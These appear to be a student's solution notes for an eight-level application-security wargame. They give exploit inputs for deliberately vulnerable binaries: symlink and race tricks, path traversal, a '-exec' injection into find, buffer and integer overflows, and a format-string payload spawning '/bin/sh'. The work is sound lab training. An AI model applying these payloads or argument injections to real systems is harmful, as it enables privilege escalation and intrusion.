Contains Solutions to the
Solutions are programmed in "C"

Solution to: level 1 

 status = system("/usr/bin/diff /var/challenge/level1/.secret ~/.secret > /dev/null"); 

 /* This indiactes that the variable status is diffrence between the file /var/challenge/level1/.secret and ~/.secret ;To be successful we need must ensure that the diff is 0.
   One way of doing it is to create a soft symbolic link between "/var/challenge/level1/.secret" and "~/.secret"  using the command "ln -s /var/challenge/level1/.secret ~/.secret" 


Solution to: level 2 

/*
Script file ""/script.sh"" is crated as the executable "./2" is run.We need to inject code while the process is sleeping and later delete the temporary file.

*/

Solution to: level 3 

/*
Reverse Path Traversal Exploit:

./3 ../../../../../usr/local/bin/l33t (Source: https://www.owasp.org/index.php/Path_Traversal)
*/

Solution to: level 4
/*

./4 "dinesh -exec /usr/local/bin/l33t {} +"

(Source: https://stackoverflow.com/questions/28727980/usr-bin-find-argument-list-too-long)


*/


Solution to: level 5 
/*

Buffer Overflow: When executing a arbitrary string of a very long length following is the output:
./5 sort aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa/usr/local/bin/l33t

Python code to crate "2*250"
 
*************
dinesh@IY5607-1718AppSec:/var/challenge/level5$ python
Python 2.7.3 (default, Oct 26 2016, 21:04:23)
[GCC 4.6.3] on linux2
Type "help", "copyright", "credits" or "license" for more information.
>>> 'a' * 250
'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa'
>>>
**************


OUTPUT:

Checking filename /var/challenge/level5/sort
Executing filename aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa/usr/local/bin/l33t

However we need to adjust the length of argv[2]such that it executes "/usr/local/bin/l33t" 

we adjust argv[2] to 192 char using python to generate the string ,use the sort command and  finally add the executable to the end of buffer.

Final Solution:  ./5 sort  'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa/usr/local/bin/l33t'

*/

Solution to: level 6
/*

Integer Overflow Identified by providing a extremely large number

dinesh@IY5607-1718AppSec:/var/challenge/level6$ ./6  11 h0 e1 l2 l3 o4 w6 o7 r8 l9 d10
hello world
dinesh@IY5607-1718AppSec:/var/challenge/level6$ ./6 12 h0 e1 l2 l3 o4 w6 o7 r8 l9 d10
hello world
dinesh@IY5607-1718AppSec:/var/challenge/level6$ ./6 12 h0 e1 l2 l3 o4 w6 o7 r8 l9 d10
hello world
dinesh@IY5607-1718AppSec:/var/challenge/level6$ ./6 120 h0 e1 l2 l3 o4 w6 o7 r8 l9 d10
hello world
dinesh@IY5607-1718AppSec:/var/challenge/level6$ ./6 220 h0 e1 l2 l3 o4 w6 o7 r8 l9 d10
hello world
dinesh@IY5607-1718AppSec:/var/challenge/level6$ ./6 520 h0 e1 l2 l3 o4 w6 o7 r8 l9 d10
hello world                                                                                                                                                                                                                                                                                                                                                                                                                                                                               
dinesh@IY5607-1718AppSec:/var/challenge/level6$ ./6 1520 h0 e1 l2 l3 o4 w6 o7 r8 l9 d10

dinesh@IY5607-1718AppSec:/var/challenge/level6$ ./6 15200 h0 e1 l2 l3 o4 w6 o7 r8 l9 d10
hello world    

**

dinesh@IY5607-1718AppSec:/var/challenge/level6$ ./6 152000000000000 h0 e1 l2 l3 o4 w6 o7 r8 l9 d10
hello¦world@  <-- overflow
**

A 23 byte "/bin/sh"  Shellcode was used to exploit this vulnerability
Compiler flags -m32 -fno-stack-protector -z execstack -mpreferred-stack-boundary=2


*/


Solution to : level 7

/*

Buffer overflow indicated by Segmentation fault if length of the three input variable is more than 64

Example:

dinesh@IY5607-1718AppSec:/var/challenge/level7$ ./7 aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb ccccccccccccccccccccccccccccccccccccccc
http://aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa:bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb@ccccccccccccccccccccccccccccccccccccccc/
dinesh@IY5607-1718AppSec:/var/challenge/level7$ ./7 aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb cccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc
http://aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbcccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc:bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbcccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc@cccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc/
Segmentation fault (core dumped)
dinesh@IY5607-1718AppSec:/var/challenge/level7$

 


A 23 byte "/bin/sh” Shellcode was used to exploit this vulnerability
Compiler flags -m32 -fno-stack-protector -z execstack -mpreferred-stack-boundary=2



*/

Solution to: level 8

/*
Format String Vulnerability:
Created both sudolog and sudoers files in the home directory.

We must split shellcode address from 65484 - 49151
Then subtract the bytes traversed (6 for log file and 10 for the input) from 49151 - 16 = 49135
65484 - 49135 = 16333


Final input: AA\x2a\xa0\x04\x08\x28\xa0\x04\x08%49135x%70$hn%16333x%71$hn

A 23 byte "/bin/sh” Shellcode was used to exploit this vulnerability
Compiler flags -m32 -fno-stack-protector -z execstack -mpreferred-stack-boundary=2
*/

